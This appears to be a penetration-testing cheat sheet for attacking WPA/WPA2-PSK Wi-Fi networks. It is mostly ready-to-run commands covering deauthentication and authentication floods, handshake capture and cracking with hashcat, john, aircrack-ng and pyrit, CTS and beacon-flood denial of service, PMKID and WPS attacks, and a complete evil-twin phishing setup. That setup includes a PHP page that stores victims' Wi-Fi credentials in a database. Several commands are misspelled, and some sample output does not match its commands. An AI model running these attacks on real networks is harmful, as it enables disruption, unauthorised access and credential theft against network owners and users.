# WPA/WPA2 PSK

## 

![WPA2-PSK Message Exchange](../../.gitbook/assets/wpa2_psk.png)

## Setup

```text
sudo airmon-ng check kill
sudo airmon-ng
sudo airmon-ng start wlan0

# Change MAC
ifconfig wlan0mon down
macchanger -s wlan0mon
ifconfig wlan0mon up
```

To restart network services:

```text
sudo airmon-ng stop wlan1mon
sudo service NetworkManager restart
```

Start capturing:

```text
# 802.11.g is for 5GHz if you don't have the suitable hardwarte try to use --band ab
sudo airodump-ng -c <CH> --bssid <BSSID> [--band abg] --write <OUT_FILE> <IFACE>
```

## Handshake Capture \(Clients needed\)

### Deauth

Consist on deauthenticate a client in order to capture de re-authentication handshake.

```text
aireplay-ng -0 10 -a <BSSID> -c <CLIENT> <IFACE>
```

### Deauth Global

The same term of deauthentication, but in that case using the brodcast MAC address in order to deauthenticate all clients.

```text
airplay-ng -0 0 -e <ESSID> -c FF:FF:FF:FF:FF:FF <IFACE>
```

### Auth attack or Authentication DoS Mode

Could be sound strange, but if you authenticate 5000 clients to the Access Point is possible to kick out client of the network and then capture their handshake.

```text
airplay-ng -1 0 -e <ESSID> -h 00:a0:8b:cd:02:65 <IFACE>  #To authenticate 1 client
```

```text
mdk3 <IFACE> a -a <BSSID> #Authenticating clients until DoS
```

Finally the AP will eject the clients with less power rate.

### Dissassociation Amok Mode Attack

Same as deauthentication attack but mdk3 gives us the opportunity to introduce `allow/deny` lists.

```text
blacklist.txt:
a0:e4:b2:45:f6:87

mdk3 <IFACE> d -w blacklist.txt -c 1
```

### Validating the handshake

Sometimes `aircrack-ng` tells us that it capture a handshake when it hasn't. So we can validate it with `pyrit`.

```text
pyrit -r Capture-01.cap analyze
```

### Filtering the capture

When we are trying to capture a handshake, maybe we are capturing a lot of packets, so we just need to filter that. \(EAPOL -&gt; Handshakes\) \(wlan.fc.type\_subtype==0x08 are Beacons\) \(wlan.fc.type\_subtype==0x05 are Probe Response\)

```text
tshark -r Capture-01.cap -Y "wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol" -F pcap 2>/dev/null
tshark -r Capture-01.cap -Y "wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol"  -w filteredCapture -F pcap 2>/dev/null

pyrit -r filteredCapture analyze
```

Also it is recommended filtering with the target BSSID.

```text
tshark -r Capture-01.cap -Y "(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) && wlan.addr==20:34:fb:b1:c5:53" -w filteredCapture -F pcap 2>/dev/null
```

IF you want to do a doble analysis you may change `-Y` parameter to `-R "FILTER" -2`

```text
tshark -r Capture-01.cap -R "(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) && wlan.addr==20:34:fb:b1:c5:53" -2 -w filteredCapture -F pcap 2>/dev/null
```

### Hash extraction

First we need to save our handshaek in HCCAP to after use `hccap2john` and crack it.

```text
aircrack-ng -J capture Capture-01.cap   # For john
hccap2john capture.hccap > handshake.hash 


aricrack-ng -j capture Capture-01.cap   # For hashcat
```

### Cracking the hanshake

#### Dictionary Attack

```text
john --wordlist=/usr/share/wordlist/rockyou.txt handshake.hash --format=wpapsk
john --show --format=wpapsk handshake.hash

aircrack-ng -w /usr/share/wordlist/rockyou.txt Capture-01.cap

hashcat -m 2500 -d 1 capture.hccapx /usr/share/wordlists/rockyou.txt --force -w 3
hashcat --show -m 2500 capture.hccapx
```

#### Rainbow Table

**Airolib + Aircrack**

With `airolib` we can create a dictionary with PMKS.

```text
airolig-ng passwords-airolib --import passwd /usr/share/wordlists/rockyou.txt
echo "<ESSID>" > essid.lst
airolib-ng passwords-airolib --import essid essid.lst

airolib-ng passwords-airolib --stats   #Test if all is working correctly

airolib-ng passwords-airolib --clean all  #Clean the wordlists to ileggible characters

airolib-ng passwords-airolib --batch  #Create the wordlists
```

Onced created we just need to use aircrack

```text
aircrack-ng -r passwords-airolib_Capture-01.cap
```

We can see that the speed of cracking of `aircrack-ng` goes from 10k/s up to 200k/s.

**Genpmk + \(Cowpatty or Pyrit\)**

First we need to create a new dictionary.

```text
genpmk -f /usr/share/wordlists/rockyou.txt -d dic.genpmk -s <SSID>
```

And crackit with Cowpatty:

```text
cowpatty -d dic.genpmk -r Captura-01.cap -s <ESSID>  #Up to 360k/s
```

More faster? try with Pyrit:

```text
pyrit -i dic.genpmk -e <ESSID> -r Captura-01.cap attack_cowpatty  #Up to 2M/s
```

You still want to go faster? Try pyrit with Database:

```text
pyrit -i /usr/share/wordlists/rockyou.txt import_passwords
pyrit -e <ESSID> create_essid
pyrit batch

#Finally attack

pyrit -r Captura-01.cap attack_db  #Up to 20M/s
```

## DoS attacks

#### CTS Frame Attack

The protocol 802.11 is CSMA CA, CA is Collision Avoidance, so in that protocol appear two new types of packets. CTS \(Clear to Send\) and RTS \(Request to Send\) that provides to the network the ability to avoid collisions between frames.

What happens if we flood the network with 1000 CTS frames with the time field on his maximum value \(30.000 us\), if we flood with that TCP stream we will hijack all the bandwidth causing a Denial of Service.

First we need to capture and modify one Clear-to-send frame and modify the Duration to 30.000 us and modify the RA address.

Onced created out evil frame we just need to send several times to the network.

```text
tcpreplay --intf1=<IFACE> --topspeed --loop=10000 evilframe.pcap 2>/dev/null

Actual: 10000 packets (460000 bytes) sent in 3.01 seconds
Rated: 152428.1 Bps, 1.21 Mbps, 3313.65 pps
Statistics for network device: wlx00c0caaba818
        Successful packets:        10000
        Failed packets:            0
        Truncated packets:         0
        Retried packets (ENOBUFS): 0
        Retried packets (EAGAIN):  0
```

In that case we busy the channel for:

$$
Time Busy = 10.000 packets * 30.000 us = 30s
$$

#### Beacon Flood Mode Attack

The beacon frame is a frame that contains information about the access point such as the channel where the AP is working, ciphers, protocols, etc.

These type of beacons are transmitted in plain as other stations and devices need these frames to extract information in order to connect them.

The idea of Beacon Flood Attack such as his name says, flood a large number of beacons in order to create a lot of ESSID in the same Chanel as the target AP in order to make it invisible for users.

```text
# Create a list of AP names:
MyNetwork1
MyNetwork2
MyNetwork3
MyNetwork4
MyNetwork5
MyNetwork6
MyNetwork7
MyNetwork8
MyNetwork9
MyNetwork10

mdk3 <IFACE> b -f networks.txt -a -s 1000 -c <CHANNEL>   # -a -> WPA2  -s <speed>
```

#### Michael Shutdown Explotation

Can shut down APs using TKIP encryption and QoS Extension with 1 sniffed and 2 injected QoS Data Packets, but less effective.

```text
mdk3 <IFACE> m -t <BSSID>
```

## Evil Twin

One of the most common techniques to obtain the password of a wireless network via phishing. It's common that the devices emit Probe Request frames when their are not associated to any AP. These Probe Request frame ares packets that contain information about which SSID the device was connected before. So we can abuse of that information in order to create a Fake AP with the same SSID.

```text
thark -i <IFACE> -Y "wlan.fc.type_subtype==4" 2>/dev/null
   1 0.000000000 Apple_7d:1f:e9 → Broadcast    802.11 195 Probe Request, SN=1063, FN=0, Flags=........C, SSID=MOVISTAR_PLUS_2A51
    2 0.019968349 Apple_7d:1f:e9 → Broadcast    802.11 195 Probe Request, SN=1064, FN=0, Flags=........C, SSID=MOVISTAR_PLUS_2A51
```

### Creating DHCP file

/etc/dhcpd.conf

```text
authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet 192.168.1.128 netmask 255.255.255.128 {
option subnet-mask 255.255.255.128;
option broadcast-address 192.168.1.255;
option routers 192.168.1.129;
option domain-name-servers 8.8.8.8;
range 192.168.1.130 192.168.1.140;
}
```

### Configuring the web page \(LOGIN ROUTER WIFI\)

Search and copy the html of a login webpage with the following action form:

```text
<tr><td><form action="dbconnect.php" method="post">
```

And the appropriate `dbconnect.php`

```text
<?php
session_start();
ob_start();
$host="localhost";
$username="fakeap";
$pass="fakeap";
$dbname="evilTwin";
$tbl_name="sniff";

// Create connection
$conn = mysqli_connect($host, $username, $pass, $dbname);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}


$username=$_POST['username'];
$password=$_POST['password'];

$sql = "INSERT INTO sniff (username, password) VALUES ('$username', '$password')";
if (mysqli_query($conn, $sql)) {
    echo "New record created successfully";
} else {
    echo "Error: " . $sql . "<br>" . mysqli_error($conn);
}

mysqli_close($conn);

sleep(2);
header("location:upgrading.html");
ob_end_flush();
?>
```

### Initializazing services

We need to start apache2 and mysql

```text
service apache2 start && service mysql start
```

### Configuring MySQL

As we can see in `dbconnect.php` it's trying to connect to a `evilTwin` db with `fakeap` user, so we just need to configure mysql properly.

#### Creating the DB

```text
mysql -u root

create database evilTwin;
create table sniff(username varchar(32), password varchar(32));

show tables;

+--------------------+
| Tables_in_evilTwin |
+--------------------+
| wpakeys            |
+--------------------+
1 row in set (0.00 sec)

insert into sniff(username, password) values ("TESTKEY", "TESTKEY");
select * from sniff;

+-----------+-----------+
| username  | password  |
+-----------+-----------+
| TESTKEY   | TESTKEY   |
+-----------+-----------+
1 row in set (0.00 sec)
```

#### Creating a user for the DB

```text
mysql -u root

create user fakeap@localhost identified by 'fakeap';
grant all privileges on evilTwin.* to 'fakeap'@'localhost';
FLUSH PRIVILEGES;
```

At this point onced we introduced credentials via the web panel, it will be appended in our database.

### Creating the AP

With `airbase` we can set up our fake AP without authentication:

```text
airbase-ng -e <ESSID> -c <CHANNEL> -P <IFACE>
```

#### Configuring a new network interface

Onced launched our new fake AP, we need to add a new network interface.

```text
ifconfig at0 192.168.1.129 netmask 255.255.255.128
route add -net 192.168.1.128 netmask 255.255.255.128 gw 192.168.1.129

echo 1 > /proc/sys/net/ipv4/ip_forward

ifconfig at0

at0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.129  netmask 255.255.255.128  broadcast 192.168.1.255
        inet6 fe80::e670:b8ff:fed3:935c  prefixlen 64  scopeid 0x20<link>
        ether e4:70:b8:d3:93:5c  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 57  bytes 8828 (8.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

#### Configuring IP tables

The idea is to redirect the traffic coming from victims from at0 to eth0 in order to give them connection to internet.

```text
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(hostname -I | awk '{print $1}'):80
iptables -t nat -A POSTROUTING -j MASQUERADE
```

#### Syncronize

Finally the last step is syncronize our rules to the fake AP.

```text
dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcp.pid at0
```

## Attacks without Clients

In this section we are not going to capture any type of handshake to obtain the hash or key. We are goin to attack the network in a client-less mode.

### PKMID Attack

This attack allows us to break the technology using Pairwise Master Key Identifier \(PKMID\) which is a characteristic available in a lot of devices.

#### Via Bettercap

The results will be exported on a pcap file.

```text
bettercap -iface <IFACE>

iface >> wifi.recon on
iface >> wifi.show

iface >> wifi.assoc all
```

#### Via hcxdumptool

Same as bettercap, the results will be exported on a pcap file.

```text
hcxdumptool -i <IFACE> -o <OUT_FILE> --enable_status=1
```

#### Export results fo hashcat && Cr4ck it!

Using `hcxpcaptool` we can easily transform the output of bettercap or hcxdumptool to hashcat.

```text
hcxpcaptool -z hashes.hash Capture.pcap

hashcat -m 16800 -d 1 -w 3 hashesh.hash /usr/share/wordslist/rockyou.txt
```

### WPS Attack

Wifi Protected Setup aka WPS is a wireless network security standard that tries to make connections between a router and devices faster and easier.

`WPSPinGenerator` is an automatic tool available in `Wifislax`.

First we need to choose the interface to work with and the channels where we want to listen. We can see the generic PINS if they are available on the network by selection the suitable SSID.

Finally we just need to test the PIN and wait for success. Noticed that after 3 fail attempts the WPS could lock.

